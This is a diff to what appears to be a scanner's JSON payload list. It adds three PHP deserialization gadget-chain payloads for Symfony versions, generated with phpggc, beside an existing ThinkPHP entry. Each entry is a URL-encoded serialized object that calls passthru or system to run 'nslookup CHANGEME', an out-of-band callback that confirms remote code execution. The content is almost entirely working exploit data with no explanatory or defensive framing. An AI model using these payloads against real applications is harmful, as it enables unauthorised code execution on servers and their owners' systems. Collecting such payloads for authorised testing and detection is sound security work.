@@ -326,6 +326,24 @@
   },
   {
     "_needs_dynamic_payload_editing": false,
+    "name": "Symfony 2.6.0 <= 4.4.18 (9)",
+    "gen_with": "./phpggc Symfony/RCE9 <function> <parameter>",
+    "payload": "O:44:\"Symfony\\Component\\Process\\Pipes\\WindowsPipes\":1:{s:57:\"%00Symfony\\Component\\Process\\Pipes\\WindowsPipes%00fileHandles\"%3BO:50:\"Symfony\\Component\\Finder\\Iterator\\SortableIterator\":2:{s:60:\"%00Symfony\\Component\\Finder\\Iterator\\SortableIterator%00iterator\"%3BO:11:\"ArrayObject\":4:{i:0%3Bi:0%3Bi:1%3Ba:2:{i:0%3Bs:8:\"passthru\"%3Bi:1%3Bs:63:\"nslookup CHANGEME\"%3B}i:2%3Ba:0:{}i:3%3BN%3B}s:56:\"%00Symfony\\Component\\Finder\\Iterator\\SortableIterator%00sort\"%3Bs:14:\"call_user_func\"%3B}}"
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
+    "name": "Symfony 2.0.4 <= 5.4.24 (all) (10)",
+    "gen_with": "./phpggc Symfony/RCE10 <function> <parameter>",
+    "payload": "O:37:\"Symfony\\Component\\BrowserKit\\Response\":1:{s:46:\"%00Symfony\\Component\\BrowserKit\\Response%00headers\"%3BO:50:\"Symfony\\Component\\Finder\\Iterator\\SortableIterator\":2:{s:60:\"%00Symfony\\Component\\Finder\\Iterator\\SortableIterator%00iterator\"%3BO:11:\"ArrayObject\":4:{i:0%3Bi:0%3Bi:1%3Ba:2:{i:0%3Bs:8:\"passthru\"%3Bi:1%3Bs:63:\"nslookup CHANGEME\"%3B}i:2%3Ba:0:{}i:3%3BN%3B}s:56:\"%00Symfony\\Component\\Finder\\Iterator\\SortableIterator%00sort\"%3Bs:14:\"call_user_func\"%3B}}"
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
+    "name": "Symfony 2.0.4 <= 5.4.24 (all) (11)",
+    "gen_with": "./phpggc Symfony/RCE11 <function> <parameter>",
+    "payload": "C:67:\"Symfony\\Component\\Security\\Core\\Authentication\\Token\\AnonymousToken\":569:{a:2:{i:0%3BN%3Bi:1%3BO:37:\"Symfony\\Component\\BrowserKit\\Response\":1:{s:46:\"%00Symfony\\Component\\BrowserKit\\Response%00headers\"%3BO:50:\"Symfony\\Component\\Finder\\Iterator\\SortableIterator\":2:{s:60:\"%00Symfony\\Component\\Finder\\Iterator\\SortableIterator%00iterator\"%3BO:51:\"Symfony\\Component\\Validator\\ConstraintViolationList\":1:{s:63:\"%00Symfony\\Component\\Validator\\ConstraintViolationList%00violations\"%3Ba:2:{i:0%3Bs:8:\"passthru\"%3Bi:1%3Bs:63:\"nslookup CHANGEME\"%3B}}s:56:\"%00Symfony\\Component\\Finder\\Iterator\\SortableIterator%00sort\"%3Bs:14:\"call_user_func\"%3B}}}}"
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
     "name": "ThinkPHP 5.1.x-5.2.x (1)",
     "gen_with": "./phpggc ThinkPHP/RCE1 <function> <parameter>",
     "payload": "O:27:\"think\\process\\pipes\\Windows\":1:{s:34:\"%00think\\process\\pipes\\Windows%00files\"%3Ba:1:{i:0%3BO:17:\"think\\model\\Pivot\":3:{s:17:\"%00think\\Model%00data\"%3Ba:1:{s:5:\"smi1e\"%3Bs:63:\"nslookup CHANGEME\"%3B}s:21:\"%00think\\Model%00withAttr\"%3Ba:1:{s:5:\"smi1e\"%3Bs:6:\"system\"%3B}s:9:\"%00*%00append\"%3Ba:1:{s:5:\"smi1e\"%3Bs:1:\"1\"%3B}}}}"
